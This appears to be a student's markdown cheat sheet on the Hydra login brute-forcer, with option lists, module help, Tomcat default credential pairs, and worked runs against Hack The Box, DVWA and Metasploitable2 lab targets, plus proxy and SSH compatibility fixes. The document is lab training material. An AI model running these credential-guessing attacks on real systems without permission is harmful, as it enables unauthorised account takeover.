- [Basic](#basic)
     - [Common Options](#common-options)
     - [Username:Password Combination](#usernamepassword-combination)
     - [Supported Services](#supported-services)
- [HTTP](#http)
     - [hydra -U http-get](#hydra--u-http-get) arrangement doesn't matter
     - [hydra -U http-get-form](#hydra--u-http-get-form)
          - [Example http-get-form](#example-http-get-form)
     - [hydra http-post-form -U](#hydra-http-post-form--u)
     - [HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables](#use-hydra_proxy_http-or-hydra_proxy-environment-variables-for-a-proxy-setup)
     - [Debug, send Hydra output to Burp](#to-debug-send-hydra-output-to-burp-use-this-in-the-same-line)
     - [Common Mistakes](#common-mistakes)
     - [Now you got it right](#now-you-got-it-right)
     - [Common Mistakes; variables argument needed for http-post-form](#common-mistakes-variables-argument-needed-for-http-post-form)
- [SSH](#ssh)
     - [hydra -L users.txt -P passwords.txt ssh://$t](#hydra--l-userstxt--p-passwordstxt-ssht)
          - [Common Problem in Metasploitable2](#metasploitable2-kex-error--no-match-for-method-server-host-key-algo)
          - [Solution: kali-tweaks](#solution-kali-tweaks)
          - [Try Again](#try-again)

# [Basic](#basic-1)
HTB: ???
```sh
hydra -C creds.txt http-get://10.10.10.95:8080/manager/html
hydra -U http-get
hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
```

## [Common Options](#common-options-1)
```sh
-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
-p PASS  or -P FILE  try password PASS, or load several passwords from FILE
-C FILE   colon separated "login:pass" format, instead of -L/-P options

-U        service module usage details

-v   verbose mode
-V   show login+pass for each attempt
-d   debug mode

-f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
```

## [Username:Password Combination](#usernamepassword-combination-1)
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
Save as: labs/htb/_BeginnerTrack/Jerry/creds.txt
```sh
admin:password
admin:
... snip ...
tomcat:admin
tomcat:changethis
```

## [Supported Services](#supported-services-1)
```sh
Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
```

# [HTTP](#http-1)

## [hydra -U http-get](#hydra--u-http-get-1)
hydra -U http-get
hydra http-get -U
```sh
$ hydra -U http-get
Help for module http-get:
============================================================================
Module http-get requires the page to authenticate.
The following parameters are optional:
 (a|A)=auth-type   specify authentication mechanism to use: BASIC, NTLM or MD5
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
 (F|S)=check for text in the HTTP reply. S= means if this text is found, a
       valid account has been found, F= means if this string is present the
       combination is invalid. Note: this must be the last option supplied.
For example:  "/secret" or "http://bla.com/foo/bar:H=Cookie\: sessid=aaaa" or "https://test.com:8080/members:A=NTLM"
```

## [hydra -U http-get-form](#hydra--u-http-get-form-1)
```sh
$ hydra -U http-get-form
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 12:04:59

Help for module http-get-form:
============================================================================
Module http-get-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters requires at a minimum three ":" separated values,
plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>

First is the page on the server to GET or POST to (URL), e.g. "/login".
Second is the POST/GET variables (taken from either the browser, proxy, etc.)
 without the initial '?' character and the usernames and passwords being
 replaced with "^USER^" ("^USER64^" for base64 encodings) and "^PASS^"
 ("^PASS64^" for base64 encodings).
Third are optional parameters (see below)
Last is the string that it checks for an *invalid* login (by default).
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong! You have to check the webapp what a
 failed string looks like and put it in this parameter! Add the -d switch to see
 the sent/received data!
 Note that using invalid login condition checks can result in false positives!

The following parameters are optional and are put between the form parameters
  and the condition string; seperate them too with colons:
 2=                  302 page forward return codes identify a successful attempt
 (c|C)=/page/uri     to define a different page to gather initial cookies from
 (g|G)=              skip pre-requests - only use this when no pre-cookies are required
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it's already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end

Note that if you are going to put colons (:) in your headers you should escape
them with a backslash (\). All colons that are not option separators should be
escaped (see the examples above and below).
You can specify a header without escaping the colons, but that way you will not
be able to put colons in the header value itself, as they will be interpreted by
hydra as option separators.

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=result=success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/:F=failedowaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:C=/exchweb":reason=
```

### [Example http-get-form](#example-http-get-form-1)
Hydra is super sensive to sequence
Make sure host first before service (http-get-form), followed by 3 compulsory parameters seperated by colon (:)
```sh
$ hydra -L usernames.txt -P best15.txt 127.0.0.1 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=26gh97rtmqv33ggsv4e1o64cl1; security=low:incorrect'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 12:51:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 45 login tries (l:3/p:15), ~3 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=26gh97rtmqv33ggsv4e1o64cl1; security=low:incorrect
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-27 12:51:52
```

## hydra http-post-form -U
```sh
$ hydra http-post-form -U
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-15 17:40:15

Help for module http-post-form:
============================================================================
Module http-post-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters requires at a minimum three ":" separated values,
plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>

First is the page on the server to GET or POST to (URL), e.g. "/login".
Second is the POST/GET variables (taken from either the browser, proxy, etc.)
 without the initial '?' character and the usernames and passwords being
 replaced with "^USER^" ("^USER64^" for base64 encodings) and "^PASS^"
 ("^PASS64^" for base64 encodings).
Third are optional parameters (see below)
Last is the string that it checks for an *invalid* login (by default).
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong! You have to check the webapp what a
 failed string looks like and put it in this parameter! Add the -d switch to see
 the sent/received data!
 Note that using invalid login condition checks can result in false positives!

The following parameters are optional and are put between the form parameters
  and the condition string; seperate them too with colons:
 2=                  302 page forward return codes identify a successful attempt
 (c|C)=/page/uri     to define a different page to gather initial cookies from
 (g|G)=              skip pre-requests - only use this when no pre-cookies are required
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it's already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end

Note that if you are going to put colons (:) in your headers you should escape
them with a backslash (\). All colons that are not option separators should be
escaped (see the examples above and below).
You can specify a header without escaping the colons, but that way you will not
be able to put colons in the header value itself, as they will be interpreted by
hydra as option separators.

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=result=success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/:F=failedowaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:C=/exchweb":reason=
```

## Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
```sh
$ hydra -h
... [snip] ...
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
... [snip] ...
```

## [To debug, send Hydra output to Burp. Use this in the same line](#to-debug-send-hydra-output-to-burp-use-this-in-the-same-line-1)
```sh
HYDRA_PROXY_HTTP=http://localhost:8080 hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
```

## [Common Mistakes](#common-mistakes-1)
login: admin   password: admin are not the right combination, see the help above
```sh
$ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html

[DATA] attacking http-get://10.10.10.95:8080/manager/html
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 2 valid passwords found

```

## [Now you got it right](#now-you-got-it-right-1)
```sh
$ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'

[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries, ~2 tries per task
[DATA] attacking http-get://10.10.10.95:8080/manager/html:F=Access Denied
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 1 valid password found
```

## [Common Mistakes; variables argument needed for http-post-form](#common-mistakes-variables-argument-needed-for-http-post-form-1)
```sh
$ hydra http-post-form://$ip
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-15 17:46:05
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[ERROR] the variables argument needs at least the strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^: (null)
```

### 
Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>
```

```

# [SSH](#ssh-1)

## hydra -L users.txt -P passwords.txt ssh://$t
### Metasploitable2: kex error : no match for method server host key algo
```sh
head -2 /usr/share/seclists/Usernames/top-usernames-shortlist.txt > users.txt
echo msfadmin >> users.txt
head -2 /usr/share/seclists/Passwords/500-worst-passwords.txt | tee passwords.txt
echo msfadmin | tee -a passwords.txt

$ hydra -L users.txt -P passwords.txt ssh://$t
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-01 09:15:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 121 login tries (l:11/p:11), ~8 tries per task
[DATA] attacking ssh://10.1.1.1:22/
[ERROR] could not connect to ssh://10.1.1.1:22 - kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [rsa-sha2-512,rsa-sha2-256,ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com]
```

#### Solution: kali-tweaks
Hardening > SSH Client > Apply > OK > Quit
```sh
$ kali-tweaks 
>>> Configuring SSH
> Enabling wide compatibility
> $ sudo cp -f /usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf /etc/ssh/ssh_config.d/kali-wide-compat.conf
[sudo] password for kali: 

┏━(Message from Kali developers)
┃ For more information about SSH configuration, please refer to:
┃ https://www.kali.org/docs/general-use/ssh-configuration/
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

> Press Enter to continue...
```

#### Try Again
```sh
$ hydra -VL users.txt -P passwords.txt ssh://$t
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-01 09:39:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://10.1.1.1:22/
[ATTEMPT] target 10.1.1.1 - login "root" - pass "123456" - 1 of 9 [child 0] (0/0)
[ATTEMPT] target 10.1.1.1 - login "root" - pass "password" - 2 of 9 [child 1] (0/0)
[ATTEMPT] target 10.1.1.1 - login "root" - pass "msfadmin" - 3 of 9 [child 2] (0/0)
[ATTEMPT] target 10.1.1.1 - login "admin" - pass "123456" - 4 of 9 [child 3] (0/0)
[ATTEMPT] target 10.1.1.1 - login "admin" - pass "password" - 5 of 9 [child 4] (0/0)
[ATTEMPT] target 10.1.1.1 - login "admin" - pass "msfadmin" - 6 of 9 [child 5] (0/0)
[ATTEMPT] target 10.1.1.1 - login "msfadmin" - pass "123456" - 7 of 9 [child 6] (0/0)
[ATTEMPT] target 10.1.1.1 - login "msfadmin" - pass "password" - 8 of 9 [child 7] (0/0)
[ATTEMPT] target 10.1.1.1 - login "msfadmin" - pass "msfadmin" - 9 of 9 [child 8] (0/0)
[22][ssh] host: 10.1.1.1   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-01 09:39:35
```

### 
```sh

```

### 
```sh

```

### 
```sh

```